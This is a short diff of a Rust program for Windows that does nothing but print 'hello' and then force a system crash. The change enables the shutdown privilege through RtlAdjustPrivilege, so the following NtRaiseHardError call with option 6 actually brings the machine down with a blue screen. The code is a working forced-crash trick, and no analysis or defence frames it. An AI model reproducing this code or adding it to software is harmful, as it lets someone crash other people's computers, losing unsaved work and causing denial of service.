@@ -24,7 +24,7 @@ fn main (){
         println!("hello");
         let mut b : BOOLEAN = 1;
         let mut response : ULONG = 0 ;
-        RtlAdjustPrivilege(19, 0, 0, &mut b);
+        RtlAdjustPrivilege(19, 1, 0, &mut b);
         NtRaiseHardError(STATUS_ASSERTION_FAILURE,0,0,0 as *mut _,6, &mut response);
         println!("{} {} ",b,response );
     }
